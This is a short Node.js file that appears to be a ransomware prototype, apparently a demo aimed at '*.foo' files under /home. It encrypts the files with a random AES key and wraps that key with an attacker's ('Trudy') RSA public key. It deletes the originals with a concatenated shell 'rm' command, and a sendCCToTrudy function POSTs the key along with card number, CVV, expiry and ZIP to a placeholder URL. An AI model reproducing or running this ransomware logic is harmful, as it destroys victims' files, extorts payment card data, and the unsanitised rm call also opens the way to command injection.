var fileFinder = require('fs-finder');
var fileStream = require('fs');
var ursa = require('ursa');
var encryptor = require('file-encryptor');
var options = { algorithm: 'aes256' };


var pubkeyTrudy = '-----BEGIN PUBLIC KEY-----\n'+
'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZSCnqlU26QVvPINDZ5Om4nSG0\n'+
'lLIbzgpEh4IEo9CFIN8E29LrqdW+D3p6mAjy2QO882ogMqjsrPhH3XSg/C46QcSg\n'+
'1wXfv0p6qN1uIOvtVU1ItZ0l9TFwhC/mjhWoPWSEiSa3Ccw8g80iTExOzXVTjZp9\n'+
'mQmilgQsNiTzlPmGgQIDAQAB\n'+
'-----END PUBLIC KEY-----\n';
var encryptedKey='';

var crypto = require('crypto'),
algorithm = 'aes-256-ctr'
//console.log(password);

var files = fileFinder.from('/home').findFiles('*.foo');
var encryptedFiles = [];

// function encrypt(text){
//   var cipher = crypto.createCipher(algorithm,password)
//   var crypted = cipher.update(text,'utf8','hex')
//   crypted += cipher.final('hex');
//   return crypted;
// }
var secureRandom = require('secure-random-string');
var password = secureRandom(64);
function decrypt(text){
  var decipher = crypto.createDecipher(algorithm,password)
  var dec = decipher.update(text,'hex','utf8')
  dec += decipher.final('utf8');
  console.log("Gotcha");
  console.log(dec);
  return dec;
}

function encryptFiles(files){
	//var secureRandom = require('secure-random-string');
  //var password = secureRandom(64);
  var pubkey = ursa.createPublicKey(pubkeyTrudy);
  encryptedKey = pubkey.encrypt(password, 'utf8', 'base64');

  files.forEach(function(file) { 
   encryptor.encryptFile(file, file+'.lock', password, options, function(err) {
     console.log('Cannot encrypt: ' + file);
   });
   encryptedFiles.push(file +'.lock');
 });
}

function deCryptFiles(key){
  //var deCipher = crypto.createDecipher(algorithm, key);

  encryptedFiles.forEach(function(file) {
   encryptor.decryptFile(file, file + '.foo', key, options, function(err) {
    console.log('Cannot de the file: '+ file);
   });
  });
}

function deleteOriginalFiles(files) {
  var sys = require('sys');
  var exe = require('child_process').exec;
  var stringToEx = 'rm ';
  files.forEach(function(file) {
   stringToEx += file;
 });
  exe(stringToEx);
}

function sendCCToTrudy(cardNumber, backNumbers, expiryDate, zip) {
  //var pubkey = ursa.createPublicKey(pubkeypem);
  var request = require('request');
  
  request.post(
    'http://www.yoursite.com/formpage',
    { json: { 
      key: encryptedKey,
      CcardNumber: cardNumber,
      backThree: backNumbers,
      expDate: expiryDate,
      zipCode: zip
    }
  },
  function (error, response, body) {
    if (!error && response.statusCode == 200) {
      return body;
    }
  });
}

var hw = "Hello World";

encryptFiles(files);
deleteOriginalFiles(files);
console.log(encryptedFiles);
console.log('Encrypted');

console.log('DeCrypting now........\n\n');

deCryptFiles(password);


//console.log(currentPath);

console.log(fileFinder.from('/home').findFiles('*.foo'));
